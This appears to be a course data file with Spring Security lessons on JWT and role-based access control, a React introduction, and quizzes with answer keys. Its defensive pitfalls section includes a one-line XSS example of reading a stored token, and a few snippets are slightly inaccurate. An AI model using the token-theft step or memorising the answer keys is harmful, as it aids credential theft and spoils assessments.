              "question": "Your application runs on 4 servers behind a load balancer. Users report being randomly logged out. What's the most likely cause and best solution?",
              "options": [
                "Session timeout too short - increase timeout",
                "Sessions stored in server memory - use Redis for shared storage",
                "CSRF tokens expiring - disable CSRF protection",
                "Cookies blocked by browser - use URL session IDs"
              ],
              "correctAnswer": 1,
              "explanation": "With in-memory sessions and multiple servers, users get logged out when the load balancer routes them to a different server than the one holding their session. The solution is centralized session storage (Redis, database) that all servers can access. Sticky sessions are a workaround but don't handle server failures.",
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "security-lesson-4",
          "title": "Lesson S.4: JWT Authentication",
          "moduleId": "module-security",
          "order": 4,
          "estimatedMinutes": 45,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem with Sessions",
              "content": "Sessions work but have limitations:\n\n1. STATEFUL:\nServer must store session data.\nWith millions of users = millions of session objects.\nMemory-intensive, requires shared storage.\n\n2. SCALING COMPLEXITY:\nNew server? Must access session store.\nMultiple data centers? Session replication across regions.\nMicroservices? Each service needs session access.\n\n3. MOBILE/SPA CHALLENGES:\nCookies don't work well for native mobile apps.\nCross-origin requests complicate cookie handling.\nMultiple clients need different session management.\n\nJWT SOLUTION:\nInstead of storing session on server...\nEncode user info IN the token itself.\nServer validates token - no lookup needed.\nTRULY STATELESS authentication."
            },
            {
              "type": "KEY_POINT",
              "title": "JWT Structure",
              "content": "JWT (JSON Web Token) has three parts:\n\nHEADER.PAYLOAD.SIGNATURE\n\nHEADER (Algorithm & Type):\n{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\"\n}\nBase64URL encoded: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\n\nPAYLOAD (Claims - the data):\n{\n  \"sub\": \"user-123\",           // Subject (user ID)\n  \"name\": \"John Doe\",\n  \"roles\": [\"USER\", \"ADMIN\"],\n  \"iat\": 1516239022,           // Issued At\n  \"exp\": 1516242622            // Expiration\n}\nBase64URL encoded: eyJzdWIiOiJ1c2VyLTEyMyIsIm5hbWUiOiJKb2huIERvZSJ9\n\nSIGNATURE:\nHMAC-SHA256(\n  base64UrlEncode(header) + \".\" + base64UrlEncode(payload),\n  secret\n)\n\nFULL TOKEN:\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.\neyJzdWIiOiJ1c2VyLTEyMyIsIm5hbWUiOiJKb2huIERvZSJ9.\nSflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n\nCAUTION: Payload is ENCODED, not ENCRYPTED.\nAnyone can decode and read it. Never put secrets in JWT!"
            },
            {
              "type": "THEORY",
              "title": "How JWT Authentication Works",
              "content": "1. LOGIN REQUEST:\nPOST /api/auth/login\n{\"username\": \"john\", \"password\": \"secret\"}\n\n2. SERVER VALIDATES & CREATES TOKEN:\n- Check credentials against database\n- Create JWT with user info + expiration\n- Sign with server's secret key\n- Return token to client\n\n{\"token\": \"eyJhbGci...\", \"expiresIn\": 3600}\n\n3. CLIENT STORES TOKEN:\n- localStorage (convenient but XSS vulnerable)\n- httpOnly cookie (more secure)\n- Memory (most secure, lost on refresh)\n\n4. AUTHENTICATED REQUESTS:\nGET /api/profile\nAuthorization: Bearer eyJhbGci...\n\n5. SERVER VALIDATES TOKEN:\n- Extract token from header\n- Verify signature (proves it wasn't tampered)\n- Check expiration\n- Extract user info from payload\n- Process request\n\nNO DATABASE LOOKUP needed to validate!\nToken contains everything needed to authenticate."
            },
            {
              "type": "EXAMPLE",
              "title": "JWT Security Configuration",
              "content": "Complete Spring Security 6 JWT setup:",
              "code": "@Configuration\n@EnableWebSecurity\npublic class SecurityConfig {\n\n    private final JwtAuthenticationFilter jwtAuthFilter;\n    private final AuthenticationProvider authenticationProvider;\n\n    @Bean\n    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {\n        return http\n            // Disable CSRF - not needed for stateless JWT\n            .csrf(csrf -> csrf.disable())\n            \n            // Stateless session - no server-side session\n            .sessionManagement(session ->\n                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))\n            \n            // Authorization rules\n            .authorizeHttpRequests(auth -> auth\n                // Public endpoints\n                .requestMatchers(\"/api/auth/**\").permitAll()\n                .requestMatchers(\"/api/public/**\").permitAll()\n                // Admin endpoints\n                .requestMatchers(\"/api/admin/**\").hasRole(\"ADMIN\")\n                // All other API endpoints require authentication\n                .anyRequest().authenticated()\n            )\n            \n            // Set authentication provider\n            .authenticationProvider(authenticationProvider)\n            \n            // Add JWT filter BEFORE username/password filter\n            .addFilterBefore(jwtAuthFilter, \n                UsernamePasswordAuthenticationFilter.class)\n            \n            .build();\n    }\n}\n\n// JWT Authentication Filter\n@Component\n@RequiredArgsConstructor\npublic class JwtAuthenticationFilter extends OncePerRequestFilter {\n\n    private final JwtService jwtService;\n    private final UserDetailsService userDetailsService;\n\n    @Override\n    protected void doFilterInternal(\n            HttpServletRequest request,\n            HttpServletResponse response,\n            FilterChain filterChain) throws ServletException, IOException {\n        \n        // Extract Authorization header\n        final String authHeader = request.getHeader(\"Authorization\");\n        \n        // Check for Bearer token\n        if (authHeader == null || !authHeader.startsWith(\"Bearer \")) {\n            filterChain.doFilter(request, response);\n            return;\n        }\n        \n        // Extract token (remove \"Bearer \" prefix)\n        final String jwt = authHeader.substring(7);\n        final String username = jwtService.extractUsername(jwt);\n        \n        // If username extracted and not already authenticated\n        if (username != null && \n            SecurityContextHolder.getContext().getAuthentication() == null) {\n            \n            UserDetails userDetails = userDetailsService\n                .loadUserByUsername(username);\n            \n            // Validate token\n            if (jwtService.isTokenValid(jwt, userDetails)) {\n                // Create authentication token\n                UsernamePasswordAuthenticationToken authToken = \n                    new UsernamePasswordAuthenticationToken(\n                        userDetails,\n                        null,\n                        userDetails.getAuthorities()\n                    );\n                \n                authToken.setDetails(\n                    new WebAuthenticationDetailsSource()\n                        .buildDetails(request)\n                );\n                \n                // Set authentication in context\n                SecurityContextHolder.getContext()\n                    .setAuthentication(authToken);\n            }\n        }\n        \n        filterChain.doFilter(request, response);\n    }\n}",
              "language": "java"
            },
            {
              "type": "EXAMPLE",
              "title": "JWT Service Implementation",
              "content": "Token generation and validation:",
              "code": "import io.jsonwebtoken.Claims;\nimport io.jsonwebtoken.Jwts;\nimport io.jsonwebtoken.io.Decoders;\nimport io.jsonwebtoken.security.Keys;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.security.core.userdetails.UserDetails;\nimport org.springframework.stereotype.Service;\n\nimport javax.crypto.SecretKey;\nimport java.util.Date;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.function.Function;\n\n@Service\npublic class JwtService {\n\n    @Value(\"${jwt.secret}\")\n    private String secretKey;  // At least 256 bits for HS256\n    \n    @Value(\"${jwt.expiration}\")\n    private long jwtExpiration;  // e.g., 86400000 (24 hours)\n\n    // Generate token with just user details\n    public String generateToken(UserDetails userDetails) {\n        return generateToken(new HashMap<>(), userDetails);\n    }\n\n    // Generate token with extra claims\n    public String generateToken(\n            Map<String, Object> extraClaims,\n            UserDetails userDetails) {\n        \n        return Jwts.builder()\n            .claims(extraClaims)\n            .subject(userDetails.getUsername())\n            .issuedAt(new Date(System.currentTimeMillis()))\n            .expiration(new Date(System.currentTimeMillis() + jwtExpiration))\n            .signWith(getSignInKey())\n            .compact();\n    }\n\n    // Validate token\n    public boolean isTokenValid(String token, UserDetails userDetails) {\n        final String username = extractUsername(token);\n        return username.equals(userDetails.getUsername()) \n            && !isTokenExpired(token);\n    }\n\n    // Extract username from token\n    public String extractUsername(String token) {\n        return extractClaim(token, Claims::getSubject);\n    }\n\n    // Extract any claim\n    public <T> T extractClaim(String token, Function<Claims, T> claimsResolver) {\n        final Claims claims = extractAllClaims(token);\n        return claimsResolver.apply(claims);\n    }\n\n    private Claims extractAllClaims(String token) {\n        return Jwts.parser()\n            .verifyWith(getSignInKey())\n            .build()\n            .parseSignedClaims(token)\n            .getPayload();\n    }\n\n    private boolean isTokenExpired(String token) {\n        return extractExpiration(token).before(new Date());\n    }\n\n    private Date extractExpiration(String token) {\n        return extractClaim(token, Claims::getExpiration);\n    }\n\n    private SecretKey getSignInKey() {\n        byte[] keyBytes = Decoders.BASE64.decode(secretKey);\n        return Keys.hmacShaKeyFor(keyBytes);\n    }\n}\n\n// application.properties:\n// jwt.secret=dGhpcyBpcyBhIHNlY3JldCBrZXkgdGhhdCBpcyBsb25nIGVub3VnaA==\n// jwt.expiration=86400000",
              "language": "java"
            },
            {
              "type": "KEY_POINT",
              "title": "Access Tokens vs Refresh Tokens",
              "content": "Production JWT systems use TWO tokens:\n\nACCESS TOKEN:\n- Short-lived (15 minutes - 1 hour)\n- Contains user info, roles\n- Sent with every API request\n- If stolen, limited damage window\n\nREFRESH TOKEN:\n- Long-lived (7-30 days)\n- Used ONLY to get new access tokens\n- Stored more securely (httpOnly cookie)\n- Can be revoked server-side\n\nFLOW:\n1. Login -> Get access token + refresh token\n2. Use access token for API calls\n3. Access token expires\n4. Send refresh token to /api/auth/refresh\n5. Get new access token\n6. Continue API calls\n\nWHY TWO TOKENS?\n- Access tokens are stateless (no DB lookup)\n- But can't be revoked once issued\n- Short expiration limits damage\n- Refresh tokens CAN be revoked (stored in DB)\n- User can \"logout everywhere\" by revoking refresh tokens"
            },
            {
              "type": "WARNING",
              "title": "JWT Security Pitfalls",
              "content": "MISTAKE 1: Weak Secret Key\n// BAD: Short, predictable secret\njwt.secret=secret123\n\n// GOOD: Long, random, base64-encoded\njwt.secret=dGhpcyBpcyBhIHZlcnkgbG9uZyBhbmQgc2VjdXJlIHNlY3JldA==\n// At least 256 bits for HS256, 384 for HS384, 512 for HS512\n\nMISTAKE 2: Storing Sensitive Data in Payload\n// BAD: Password, SSN, credit card in token\n{\"password\": \"secret\", \"ssn\": \"123-45-6789\"}\n\n// Payload is BASE64 ENCODED, not encrypted!\n// Anyone with token can decode and read it\n\nMISTAKE 3: No Expiration\n// BAD: Token valid forever\n.expiration(null)  // Never expires!\n\n// GOOD: Short expiration\n.expiration(new Date(now + 15 * 60 * 1000))  // 15 minutes\n\nMISTAKE 4: Algorithm Confusion\n// Attacker sends: {\"alg\": \"none\"}\n// Some libraries accept unsigned tokens!\n// ALWAYS verify algorithm matches expected\n\nMISTAKE 5: localStorage XSS Vulnerability\n// If attacker has XSS, they can steal token:\ndocument.localStorage.getItem('token');\n\n// Consider httpOnly cookies for token storage"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "security-lesson-4-mc-1",
              "title": "JWT Structure",
              "description": "Understanding JWT components",
              "question": "Which JWT component prevents an attacker from modifying the payload (e.g., changing roles from USER to ADMIN)?",
              "options": [
                "Header - specifies the encryption algorithm",
                "Payload - contains the user claims",
                "Signature - cryptographic proof of integrity",
                "Base64 encoding - obscures the content"
              ],
              "correctAnswer": 2,
              "explanation": "The signature is created by hashing (header + payload) with a secret key. If an attacker modifies the payload, they can't create a valid signature without the secret. When the server validates, it recalculates the signature and compares - modified tokens fail validation. Base64 is encoding, not security.",
              "difficulty": "advanced"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "security-lesson-4-mc-2",
              "title": "Token Strategy",
              "description": "Understanding access and refresh tokens",
              "question": "Why use short-lived access tokens (15 min) with long-lived refresh tokens (7 days) instead of just one long-lived access token?",
              "options": [
                "Short tokens are smaller and faster to transmit",
                "Short access tokens limit damage if stolen; refresh tokens can be revoked server-side",
                "Refresh tokens provide better encryption",
                "Short tokens don't need signatures"
              ],
              "correctAnswer": 1,
              "explanation": "Access tokens are stateless - once issued, they can't be revoked until they expire. Short expiration limits the window of abuse if stolen. Refresh tokens are stored server-side and CAN be revoked (logout, password change, suspicious activity). This balances security (short access token lifetime) with UX (user doesn't re-login constantly).",
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "security-lesson-5",
          "title": "Lesson S.5: Role-Based Access Control",
          "moduleId": "module-security",
          "order": 5,
          "estimatedMinutes": 35,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "Beyond Simple Authentication",
              "content": "Authentication answers: \"Who are you?\"\nAuthorization answers: \"What can you do?\"\n\nSIMPLE AUTHORIZATION:\n- Authenticated vs Anonymous\n- All logged-in users have same access\n\nROLE-BASED ACCESS CONTROL (RBAC):\n- Users have ROLES (Admin, Manager, User)\n- Roles have PERMISSIONS\n- Resources require specific roles\n\nExample Organization:\n\nAdmin Role:\n- Manage users\n- Access all data\n- System configuration\n\nManager Role:\n- View reports\n- Manage team members\n- Edit department data\n\nUser Role:\n- View own data\n- Edit own profile\n- Submit requests\n\nBenefits:\n- Principle of least privilege\n- Easy to audit (who can do what)\n- Simple to update (change role, not individual permissions)"
            },
            {
              "type": "KEY_POINT",
              "title": "Roles vs Authorities in Spring Security",
              "content": "Spring Security has two concepts:\n\nROLES:\n- Prefixed with ROLE_ internally\n- Represent job functions\n- Coarse-grained\n\n.hasRole(\"ADMIN\")  // Checks for ROLE_ADMIN authority\n.hasAnyRole(\"ADMIN\", \"MANAGER\")\n\nAUTHORITIES:\n- Fine-grained permissions\n- No prefix convention\n- Flexible naming\n\n.hasAuthority(\"user:read\")\n.hasAuthority(\"user:write\")\n.hasAuthority(\"ROLE_ADMIN\")  // Same as hasRole(\"ADMIN\")\n\nBest Practice:\n\n// User entity\npublic class User {\n    private Set<Role> roles;  // ADMIN, MANAGER, USER\n}\n\n// Role entity\npublic class Role {\n    private String name;\n    private Set<Permission> permissions;  // user:read, user:write\n}\n\n// Grant both roles AND permissions as authorities\npublic Collection<? extends GrantedAuthority> getAuthorities() {\n    Set<SimpleGrantedAuthority> authorities = new HashSet<>();\n    \n    // Add roles\n    roles.forEach(role -> \n        authorities.add(new SimpleGrantedAuthority(\"ROLE_\" + role.getName())));\n    \n    // Add permissions\n    roles.forEach(role ->\n        role.getPermissions().forEach(permission ->\n            authorities.add(new SimpleGrantedAuthority(permission.getName()))));\n    \n    return authorities;\n}"
            },
            {
              "type": "THEORY",
              "title": "Method-Level Security",
              "content": "URL-based security isn't always enough:\n\n@Service\npublic class UserService {\n    \n    public User getUser(Long id) {\n        // Anyone authenticated can call this method\n        // But should manager only see their team?\n        // Should users only see themselves?\n    }\n}\n\nMethod security provides fine-grained control:\n\n@Configuration\n@EnableMethodSecurity  // Enable method-level security\npublic class SecurityConfig { }\n\nNow use annotations on methods:\n\n@PreAuthorize(\"hasRole('ADMIN')\")\npublic void deleteUser(Long id) { }\n\n@PreAuthorize(\"hasAuthority('report:view')\")\npublic Report generateReport() { }\n\n@PostAuthorize(\"returnObject.owner == authentication.name\")\npublic Document getDocument(Long id) { }\n\n@PreFilter and @PostFilter for collections."
            },
            {
              "type": "EXAMPLE",
              "title": "@PreAuthorize Expressions",
              "content": "SpEL (Spring Expression Language) for complex authorization:",
              "code": "@Service\npublic class DocumentService {\n\n    // Simple role check\n    @PreAuthorize(\"hasRole('ADMIN')\")\n    public void deleteAllDocuments() { }\n\n    // Multiple roles (OR)\n    @PreAuthorize(\"hasRole('ADMIN') or hasRole('MANAGER')\")\n    public List<Document> getAllDocuments() { }\n\n    // Permission-based\n    @PreAuthorize(\"hasAuthority('document:write')\")\n    public Document createDocument(Document doc) { }\n\n    // Access method parameters\n    @PreAuthorize(\"#userId == authentication.principal.id\")\n    public User getUser(Long userId) { }\n\n    // Complex expression - only own documents or admin\n    @PreAuthorize(\"#document.ownerId == authentication.principal.id \" +\n                  \"or hasRole('ADMIN')\")\n    public void updateDocument(@P(\"document\") Document document) { }\n\n    // Check returned value (runs AFTER method)\n    @PostAuthorize(\"returnObject.owner == authentication.name \" +\n                   \"or hasRole('ADMIN')\")\n    public Document getDocument(Long id) {\n        return documentRepository.findById(id).orElseThrow();\n    }\n\n    // Filter collections - only return permitted items\n    @PostFilter(\"filterObject.department == authentication.principal.department \" +\n                \"or hasRole('ADMIN')\")\n    public List<Document> searchDocuments(String query) {\n        return documentRepository.search(query);  // Filter applied after\n    }\n\n    // Custom security method\n    @PreAuthorize(\"@documentSecurity.canAccess(authentication, #id)\")\n    public Document getSecureDocument(Long id) { }\n}\n\n// Custom security bean\n@Component(\"documentSecurity\")\npublic class DocumentSecurityService {\n    \n    public boolean canAccess(Authentication auth, Long documentId) {\n        // Complex business logic\n        Document doc = documentRepository.findById(documentId).orElse(null);\n        if (doc == null) return false;\n        \n        User user = (User) auth.getPrincipal();\n        return doc.getOwnerId().equals(user.getId()) ||\n               doc.getSharedWith().contains(user.getId()) ||\n               user.getRoles().contains(\"ADMIN\");\n    }\n}",
              "language": "java"
            },
            {
              "type": "KEY_POINT",
              "title": "Controller-Level Security",
              "content": "Apply security at the controller level:\n\n@RestController\n@RequestMapping(\"/api/admin\")\n@PreAuthorize(\"hasRole('ADMIN')\")\npublic class AdminController {\n    \n    // All methods require ADMIN role\n    \n    @GetMapping(\"/users\")\n    public List<User> getUsers() { }  // ADMIN required\n    \n    @DeleteMapping(\"/users/{id}\")\n    public void deleteUser(@PathVariable Long id) { }  // ADMIN required\n    \n    // Override for specific method\n    @GetMapping(\"/stats\")\n    @PreAuthorize(\"hasAnyRole('ADMIN', 'MANAGER')\")\n    public Stats getStats() { }  // ADMIN or MANAGER\n}\n\n// Combine URL and method security\n@Configuration\n@EnableWebSecurity\n@EnableMethodSecurity\npublic class SecurityConfig {\n    \n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        return http\n            .authorizeHttpRequests(auth -> auth\n                // Coarse-grained URL security\n                .requestMatchers(\"/api/admin/**\").hasRole(\"ADMIN\")\n                .requestMatchers(\"/api/**\").authenticated()\n            )\n            // Method security provides fine-grained control\n            .build();\n    }\n}\n\nBEST PRACTICE:\n- URL security for broad access patterns\n- Method security for business-logic authorization\n- Use both for defense in depth"
            },
            {
              "type": "THEORY",
              "title": "Implementing RBAC in Database",
              "content": "Store roles and permissions in database:\n\n// User entity\n@Entity\npublic class User {\n    @Id @GeneratedValue\n    private Long id;\n    \n    private String username;\n    private String password;\n    \n    @ManyToMany(fetch = FetchType.EAGER)\n    @JoinTable(name = \"user_roles\",\n        joinColumns = @JoinColumn(name = \"user_id\"),\n        inverseJoinColumns = @JoinColumn(name = \"role_id\"))\n    private Set<Role> roles = new HashSet<>();\n}\n\n// Role entity\n@Entity\npublic class Role {\n    @Id @GeneratedValue\n    private Long id;\n    \n    private String name;  // ADMIN, MANAGER, USER\n    \n    @ManyToMany(fetch = FetchType.EAGER)\n    @JoinTable(name = \"role_permissions\",\n        joinColumns = @JoinColumn(name = \"role_id\"),\n        inverseJoinColumns = @JoinColumn(name = \"permission_id\"))\n    private Set<Permission> permissions = new HashSet<>();\n}\n\n// Permission entity\n@Entity\npublic class Permission {\n    @Id @GeneratedValue\n    private Long id;\n    \n    private String name;  // user:read, user:write, report:view\n}\n\n// Database tables:\n// users: id, username, password\n// roles: id, name\n// permissions: id, name\n// user_roles: user_id, role_id\n// role_permissions: role_id, permission_id\n\nThis allows runtime role/permission management without code changes."
            },
            {
              "type": "WARNING",
              "title": "Authorization Security Pitfalls",
              "content": "MISTAKE 1: Client-Side Only Authorization\n// Frontend hides admin button\n{isAdmin && <AdminButton />}\n\n// But API is unprotected!\n// Attacker directly calls /api/admin/delete\n\nFIX: ALWAYS enforce on server side.\n\nMISTAKE 2: Role in JWT Without Verification\n// Token contains roles\n{\"roles\": [\"USER\"]}\n\n// User modifies to:\n{\"roles\": [\"ADMIN\"]}\n\n// If signature not verified, user is now admin!\n\nFIX: Validate signature; consider fetching roles from DB.\n\nMISTAKE 3: Insecure Direct Object Reference (IDOR)\n// Get document by ID\n@GetMapping(\"/documents/{id}\")\npublic Document getDocument(@PathVariable Long id) {\n    return documentRepo.findById(id);  // No ownership check!\n}\n\n// User A can access User B's documents by guessing IDs\n\nFIX: Always verify ownership or permission.\n@PostAuthorize(\"returnObject.owner == authentication.name\")\n\nMISTAKE 4: Missing Authorization on Modifications\n// Checks permission to view\n@PreAuthorize(\"hasAuthority('doc:read')\")\npublic Document getDoc(Long id) { }\n\n// Forgets to check permission to modify!\npublic void updateDoc(Document doc) { }  // No check!\n\nFIX: Apply appropriate authorization to ALL sensitive methods."
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "security-lesson-5-mc-1",
              "title": "@PreAuthorize vs @PostAuthorize",
              "description": "Understanding when to use each annotation",
              "question": "When should you use @PostAuthorize instead of @PreAuthorize?",
              "options": [
                "When you need better performance",
                "When authorization depends on the returned object's properties",
                "When checking multiple roles",
                "When using JWT authentication"
              ],
              "correctAnswer": 1,
              "explanation": "@PostAuthorize runs AFTER the method executes, so you can access the return value. Use it when authorization depends on the returned object (e.g., 'user can only see their own document'). @PreAuthorize runs before and is preferred when you don't need the return value, as it fails fast without executing potentially expensive operations.",
              "difficulty": "advanced"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "security-lesson-5-mc-2",
              "title": "Roles vs Authorities",
              "description": "Understanding Spring Security's role and authority concepts",
              "question": "In Spring Security, what is the relationship between hasRole('ADMIN') and hasAuthority('ROLE_ADMIN')?",
              "options": [
                "hasRole is for URL security, hasAuthority is for method security",
                "They are equivalent - hasRole adds the ROLE_ prefix automatically",
                "hasAuthority provides encryption, hasRole does not",
                "hasRole checks database, hasAuthority checks JWT"
              ],
              "correctAnswer": 1,
              "explanation": "hasRole('ADMIN') and hasAuthority('ROLE_ADMIN') are equivalent. Spring Security automatically prefixes 'ROLE_' when using hasRole(). This is a convention - roles use the prefix, while authorities (fine-grained permissions like 'user:read') typically don't. Use hasRole for job functions, hasAuthority for specific permissions.",
              "difficulty": "advanced"
            }
          ]
        }
      ],
      "order": 12
    },
    {
      "id": "module-react",
      "title": "React Frontend Integration",
      "description": "Build modern React frontends that connect to Spring Boot backends. Master components, state, API integration, and authentication flows.",
      "difficulty": "intermediate",
      "estimatedHours": 3.75,
      "lessons": [
        {
          "id": "react-lesson-1",
          "title": "Lesson R.1: Frontend Fundamentals",
          "moduleId": "module-react",
          "order": 1,
          "estimatedMinutes": 30,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Your API Needs a Face",
              "content": "You've built a powerful Spring Boot API. It can authenticate users, store data, and process requests. But there's a problem:\n\nCURL COMMAND:\ncurl -X POST http://localhost:8080/api/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"john\",\"password\":\"secret\"}'\n\nIs this how your users will interact with your app? Through terminal commands?\n\nOf course not. Users need:\n- Buttons to click\n- Forms to fill out\n- Visual feedback\n- Intuitive navigation\n\nThis is where the FRONTEND comes in. The frontend is the user interface - what people see and interact with. Your Spring Boot backend is the engine; the frontend is the dashboard and steering wheel."
            },
            {
              "type": "KEY_POINT",
              "title": "The Web Trilogy: HTML, CSS, JavaScript",
              "content": "Every web page is built from three technologies:\n\nHTML (Structure):\n- The skeleton of your page\n- Defines WHAT content exists\n- Headings, paragraphs, buttons, forms, images\n\n<button id=\"loginBtn\">Login</button>\n\nCSS (Style):\n- The clothing of your page\n- Defines HOW content looks\n- Colors, fonts, spacing, animations\n\n#loginBtn {\n    background-color: blue;\n    color: white;\n    padding: 10px 20px;\n    border-radius: 5px;\n}\n\nJavaScript (Behavior):\n- The brain of your page\n- Defines WHAT HAPPENS when users interact\n- Click handlers, API calls, dynamic updates\n\ndocument.getElementById('loginBtn').addEventListener('click', () => {\n    fetch('/api/login', { method: 'POST', body: formData });\n});\n\nThink of building a house:\n- HTML = walls, rooms, doors\n- CSS = paint, furniture, decorations\n- JavaScript = electrical system, plumbing"
            },
            {
              "type": "THEORY",
              "title": "The DOM: Your Page as a Tree",
              "content": "When a browser loads HTML, it creates the DOM (Document Object Model) - a tree structure representing your page:\n\nHTML:\n<html>\n  <body>\n    <div id=\"app\">\n      <h1>Welcome</h1>\n      <button>Click me</button>\n    </div>\n  </body>\n</html>\n\nDOM TREE:\nhtml\n└── body\n    └── div#app\n        ├── h1 (\"Welcome\")\n        └── button (\"Click me\")\n\nJavaScript can:\n- READ the DOM: document.getElementById('app')\n- MODIFY the DOM: element.textContent = 'New text'\n- ADD to the DOM: parent.appendChild(newElement)\n- REMOVE from DOM: element.remove()\n\nTHE PROBLEM WITH VANILLA JS:\n\n// Updating a user list manually\nfunction updateUsers(users) {\n    const list = document.getElementById('userList');\n    list.innerHTML = '';  // Clear existing\n    users.forEach(user => {\n        const li = document.createElement('li');\n        li.textContent = user.name;\n        li.addEventListener('click', () => selectUser(user.id));\n        list.appendChild(li);\n    });\n}\n\nThis is tedious, error-prone, and doesn't scale. React solves this."
            },
            {
              "type": "KEY_POINT",
              "title": "Why React?",
              "content": "React is a JavaScript library for building user interfaces.\n\nINSTEAD OF:\n- Manually creating DOM elements\n- Tracking what needs to update\n- Managing event listeners\n- Syncing data with UI\n\nREACT PROVIDES:\n- Declarative UI (describe what you want, not how)\n- Component-based architecture\n- Automatic DOM updates when data changes\n- Efficient rendering (Virtual DOM)\n\nVANILLA JS (imperative):\nconst button = document.createElement('button');\nbutton.textContent = 'Count: 0';\nlet count = 0;\nbutton.addEventListener('click', () => {\n    count++;\n    button.textContent = 'Count: ' + count;\n});\ndocument.body.appendChild(button);\n\nREACT (declarative):\nfunction Counter() {\n    const [count, setCount] = useState(0);\n    return (\n        <button onClick={() => setCount(count + 1)}>\n            Count: {count}\n        </button>\n    );\n}\n\nReact is used by Facebook, Instagram, Netflix, Airbnb, and millions of other applications."
            },
            {
              "type": "THEORY",
              "title": "Full-Stack Architecture",
              "content": "Your complete application will have two parts:\n\nBACKEND (Spring Boot) - Port 8080:\n- REST API endpoints\n- Business logic\n- Database access\n- Authentication\n- Runs on JVM\n\nFRONTEND (React) - Port 5173:\n- User interface\n- Forms and buttons\n- Displays data from API\n- Handles user interactions\n- Runs in browser\n\nDATA FLOW:\n\n[User Browser]\n     |\n     | (1) User clicks 'Login'\n     v\n[React Frontend :5173]\n     |\n     | (2) fetch('http://localhost:8080/api/login')\n     v\n[Spring Boot :8080]\n     |\n     | (3) Validate credentials\n     v\n[Database]\n     |\n     | (4) Return user data\n     v\n[Spring Boot :8080]\n     |\n     | (5) Send JSON response\n     v\n[React Frontend]\n     |\n     | (6) Update UI with user info\n     v\n[User sees: 'Welcome, John!']\n\nThis is the architecture you'll build in this module."
            },
            {
              "type": "WARNING",
              "title": "CORS: The Security Barrier",
              "content": "When your React app (port 5173) tries to call your Spring Boot API (port 8080), the browser will BLOCK the request:\n\nAccess to fetch at 'http://localhost:8080/api/users' \nfrom origin 'http://localhost:5173' has been blocked by CORS policy.\n\nCORS (Cross-Origin Resource Sharing) is a security feature. Browsers prevent JavaScript from making requests to different origins (domain + port) by default.\n\nWITHOUT CORS CONFIG:\n- React (localhost:5173) cannot call API (localhost:8080)\n- Browser blocks the request before it reaches your server\n- Your perfectly good API is inaccessible\n\nSOLUTION:\nConfigure Spring Boot to ALLOW requests from your React app:\n\n@Configuration\npublic class CorsConfig implements WebMvcConfigurer {\n    @Override\n    public void addCorsMappings(CorsRegistry registry) {\n        registry.addMapping(\"/api/**\")\n            .allowedOrigins(\"http://localhost:5173\")\n            .allowedMethods(\"GET\", \"POST\", \"PUT\", \"DELETE\")\n            .allowedHeaders(\"*\")\n            .allowCredentials(true);\n    }\n}\n\nWe'll cover this in detail in Lesson R.4."
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "react-lesson-1-mc-1",
              "title": "Frontend Technologies",
              "description": "Understanding the roles of HTML, CSS, and JavaScript",
              "question": "You want to make a button turn red when a user hovers over it, and display an alert when clicked. Which technologies are involved?",
              "options": [
                "HTML only - it defines the button",
                "HTML for the button, CSS for the hover effect, JavaScript for the alert",
                "JavaScript only - it handles all interactivity",
                "CSS for styling, JavaScript for everything else"
              ],
              "correctAnswer": 1,
              "explanation": "HTML defines the button element (<button>). CSS handles the visual change on hover (:hover pseudo-class changes background-color). JavaScript handles the click event and displays the alert. Each technology has its specific role: HTML for structure, CSS for presentation, JavaScript for behavior.",
              "difficulty": "beginner"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "react-lesson-1-mc-2",
              "title": "CORS Purpose",
              "description": "Understanding why CORS exists",
              "question": "Why does the browser block requests from localhost:5173 to localhost:8080 by default?",
              "options": [
                "The ports are different so the connection fails",
                "Spring Boot rejects requests from unknown sources",
                "CORS security policy prevents cross-origin requests to protect users",
                "React cannot make HTTP requests without special configuration"
              ],
              "correctAnswer": 2,
              "explanation": "CORS (Cross-Origin Resource Sharing) is a browser security feature that prevents JavaScript from making requests to different origins (different domain, port, or protocol). This protects users from malicious sites making unauthorized requests to other services. The server must explicitly allow cross-origin requests by sending appropriate CORS headers.",
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "react-lesson-2",
          "title": "Lesson R.2: React Introduction",
          "moduleId": "module-react",
          "order": 2,
          "estimatedMinutes": 40,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "Setting Up React with Vite",
